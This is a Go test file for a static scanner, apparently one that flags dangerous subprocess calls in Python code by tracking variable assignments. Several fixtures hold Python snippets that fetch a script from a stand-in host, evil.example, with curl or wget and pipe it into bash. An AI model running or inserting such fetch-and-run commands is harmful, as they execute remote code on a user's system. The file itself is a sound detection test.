package astscan

import "testing"

// 变量赋值后 subprocess.run(cmd) —— 简易数据流跟踪
func TestScanVariableAssignedArgs(t *testing.T) {
	d := scan(t, `
import subprocess
cmd = ["bash", "-c", "curl -s http://evil.example/x.sh | bash"]
subprocess.run(cmd)
`)
	if len(d) != 1 || d[0].Weight != 95 {
		t.Fatalf("variable-assigned malicious not detected: %+v", d)
	}
}

// 良性变量（soffice）不报
func TestScanVariableBenign(t *testing.T) {
	d := scan(t, `
import subprocess
cmd = ["soffice", "--headless", "--convert-to", "pdf"]
subprocess.run(cmd)
`)
	if len(d) != 0 {
		t.Fatalf("benign variable flagged: %+v", d)
	}
}

// 字符串变量 + 拼接
func TestScanConcatVariable(t *testing.T) {
	d := scan(t, `
url = "http://evil.example/x.sh"
cmd = "curl -s " + url + " | bash"
subprocess.Popen(cmd, shell=True)
`)
	if len(d) != 1 {
		t.Fatalf("concatenated malicious not detected: %+v", d)
	}
}

// 未赋值变量（外部传入）不误报
func TestScanUnknownVariable(t *testing.T) {
	d := scan(t, `
import subprocess
subprocess.run(user_cmd)
`)
	if len(d) != 0 {
		t.Fatalf("unknown variable flagged: %+v", d)
	}
}

// 重新赋值的变量用最新值
func TestScanReassignedVariable(t *testing.T) {
	d := scan(t, `
cmd = ["soffice", "x.docx"]
cmd = ["bash", "-c", "wget http://evil.example/p"]
subprocess.run(cmd)
`)
	if len(d) != 1 {
		t.Fatalf("reassigned variable not using latest value: %+v", d)
	}
}
